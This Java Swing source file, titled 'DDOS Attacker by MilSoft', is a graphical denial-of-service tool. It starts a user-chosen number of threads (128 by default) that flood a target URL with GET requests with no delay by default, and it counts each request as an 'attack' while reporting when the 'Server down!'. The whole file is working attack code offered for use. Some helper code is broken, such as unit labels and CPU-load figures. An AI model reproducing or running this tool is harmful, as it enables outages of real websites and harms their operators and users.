import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.lang.management.ManagementFactory;
import java.lang.management.ThreadMXBean;

public class WebPingApp extends JFrame {

    private JTextField urlField;
    private JSpinner threadCountField;
    private JSpinner timeoutField;
    private JButton startButton;
    private JLabel statusLabel;
    private JList<String> threadList;
    private DefaultListModel<String> threadListModel;
    private List<PingThread> threads;
    private JSpinner waitField;
    
    public WebPingApp() {
        setTitle("DDOS Attacker by MilSoft");
        setSize(1000, 1000);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        createUI();
    }

    private void createUI() {
        JPanel controlPanel = new JPanel();
        controlPanel.setLayout(new FlowLayout());

        urlField = new JTextField("https://www.example.com", 20);
        threadCountField = new JSpinner(new SpinnerNumberModel(128, 1, Integer.MAX_VALUE, 1));
        timeoutField = new JSpinner(new SpinnerNumberModel(0, 0, 1000, 1));
        waitField = new JSpinner(new SpinnerNumberModel(5000, 0, 60000, 500));
        startButton = new JButton("Start attack");

        controlPanel.add(new JLabel("URL:"));
        controlPanel.add(urlField);
        controlPanel.add(new JLabel("Attackers:"));
        controlPanel.add(threadCountField);
        controlPanel.add(new JLabel("Timeout (ms):"));
        controlPanel.add(timeoutField);
        controlPanel.add(new JLabel("Connection time (ms):"));
        controlPanel.add(waitField);
        controlPanel.add(startButton);

        statusLabel = new JLabel("Status: ");
        threadListModel = new DefaultListModel<>();
        threadList = new JList<>(threadListModel);
        threadList.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        threadList.addListSelectionListener(e -> showThreadDetails());

        JPanel statusPanel = new JPanel();
        statusPanel.setLayout(new BorderLayout());
        statusPanel.add(statusLabel, BorderLayout.NORTH);
        statusPanel.add(new JScrollPane(threadList), BorderLayout.CENTER);

        getContentPane().add(controlPanel, BorderLayout.NORTH);
        getContentPane().add(statusPanel, BorderLayout.CENTER);

        startButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (startButton.getText().equals("Start attack")) {
                    startThreads();
                } else {
                    stopThreads();
                }
            }
        });
    }

    private void startThreads() {
    	String url = urlField.getText();
        int numThreads = (Integer) threadCountField.getValue();
        int timeout = (Integer) timeoutField.getValue();
        int readTimeout = (Integer) waitField.getValue();

        threads = new ArrayList<>();
        threadListModel.clear();

        for (int i = 0; i < numThreads; i++) {
            threadListModel.addElement("Attacker " + (i + 1) + ": Waiting to start...");
        }

        for (int i = 0; i < numThreads; i++) {
            PingThread pingThread = new PingThread(i, url, timeout, readTimeout);
            threads.add(pingThread);
            new Thread(pingThread).start();
        }

        startButton.setText("Stop attack");
    }

    private void stopThreads() {
        for (PingThread thread : threads) {
            thread.stopRunning();
        }
        startButton.setText("Start attack");
    }
    
    private void showThreadDetails() {
    	int selectedIndex = threadList.getSelectedIndex();
        if (selectedIndex != -1) {
            PingThread selectedThread = threads.get(selectedIndex);
            String details = String.format(
                    "Thread %d:\nStatus: %s\nCPU Load: %f%%\nNetwork Speed: %f KB/s",
                    selectedThread.getId(),
                    selectedThread.isActive() ? "Active" : "Inactive",
                    selectedThread.getCpuLoad(),
                    selectedThread.getNetworkSpeed()
            );
            JOptionPane.showMessageDialog(this, details);
        }
    }
    private class PingThread implements Runnable {
        private int id;
        private String url;
        private int timeout;
        private int readTimeout;
        private boolean running;
        private boolean stopped;
        private double networkSpeed;
        private double cpuLoad;
        private long attacks;
        private ThreadMXBean threadMxBean;

        public PingThread(int id, String url, int timeout, int readTimeout) {
            this.id = id;
            this.url = url;
            this.timeout = timeout;
            this.running = true;
            this.stopped = false;
            this.attacks = 0;
            this.readTimeout = readTimeout;
        }

        public void stopRunning() {
            running = false;
            stopped = true;
            Thread.currentThread().interrupt();
        }
        
        public int getId() {
        	return id;
        }
        
        public boolean isActive() {
        	return running;
        }

        public double getCpuLoad() {
        	ThreadMXBean threadMxBean = ManagementFactory.getThreadMXBean();
        	long cpuTime = threadMxBean.getThreadCpuTime(Thread.currentThread().getId());
        	
        	return (cpuTime * 100.0) / System.nanoTime();
        }
        
        public double getNetworkSpeed() {
        	return networkSpeed;
        }
        
        @Override
        public void run() {
        	while (!stopped) {
                try {
                    long startTime = System.nanoTime();
                    // Set up the connection to use the default proxy settings
                    System.setProperty("java.net.useSystemProxies", "true");
                    HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
                    connection.setRequestMethod("GET");
                    connection.setConnectTimeout(readTimeout);
                    connection.setReadTimeout(readTimeout);
                    int responseCode = connection.getResponseCode();
                    if (responseCode == 200) {
                        //try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                            //String inputLine;
                            //while ((inputLine = in.readLine()) != null) {
                                // Process the input line if needed
                            //}
                        //}
                        attacks++;
                        threadListModel.set(id, "Attacker " + (id + 1) + ": Success, " + attacks + " Attacks");
                        running = true; // Mark as active
                    } else {
                        threadListModel.set(id, "Attacker " + (id + 1) + ": Server down! " + responseCode);
                        running = false; // Mark as inactive
                    }
                    connection.disconnect();
                    long endTime = System.nanoTime();
                    long duration = endTime - startTime;

                    networkSpeed = connection.getContentLength() / (duration / 1_000_000_000.0) / 1_024; // Convert to MB/s
                    
                    Thread.sleep(timeout); // Sleep for the specified timeout before the next request
                } catch (Exception e) {
                    threadListModel.set(id, "Attacker " + (id + 1) + ": Error " + e);
                    running = false; // Mark as inactive
                }
                try {
                	Thread.sleep(timeout);
                } catch (InterruptedException ie) {
                	threadListModel.set(id, "Attacker " + (id + 1) + ": Error " + ie);
                    running = false;
                }
                updateStatusLabel(); // Update status for each iteration
        	}
        }

        private void updateStatusLabel() {
            SwingUtilities.invokeLater(new Runnable() {
                @Override
                public void run() {
                    int activeCount = 0;
                    int inactiveCount = 0;
                    long globalattacks = 0;
                    for (PingThread thread : threads) {
                        if (thread.running) {
                            activeCount++;
                        } else {
                            inactiveCount++;
                        }
                        globalattacks = thread.attacks + globalattacks;
                    }
                    statusLabel.setText(String.format("Status: Active Attackers: %d, Inactive Attackers: %d, Attacks: %d", activeCount, inactiveCount, globalattacks));
                }
            });
        }

        private static double getThreadCpuUsage(String threadId) {
            String os = System.getProperty("os.name").toLowerCase();

            try {
                if (os.contains("win")) {
                    return getThreadCpuUsageWindows(threadId);
                } else if (os.contains("nix") || os.contains("nux") || os.contains("mac")) {
                    return getThreadCpuUsageUnix(threadId);
                } else {
                    System.err.println("Betriebssystem nicht unterstützt.");
                    return -1;
                }
            } catch (Exception e) {
                e.printStackTrace();
                return -1;
            }
        }

        private static double getThreadCpuUsageWindows(String threadId) throws Exception {
            String command = "wmic path Win32_PerfFormattedData_PerfProc_Thread where IDProcess=" + threadId + " get PercentProcessorTime";
            Process process = Runtime.getRuntime().exec(command);
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.matches("\\d+")) {
                        return Double.parseDouble(line);
                    }
                }
            }
            return -1;
        }

        private static double getThreadCpuUsageUnix(String threadId) throws Exception {
            String command = "ps -p " + threadId + " -o %cpu";
            Process process = Runtime.getRuntime().exec(command);
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.matches("\\d+\\.\\d+")) {
                        return Double.parseDouble(line);
                    }
                }
            }
            return -1;
        }
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                new WebPingApp().setVisible(true);
            }
        });
    }
}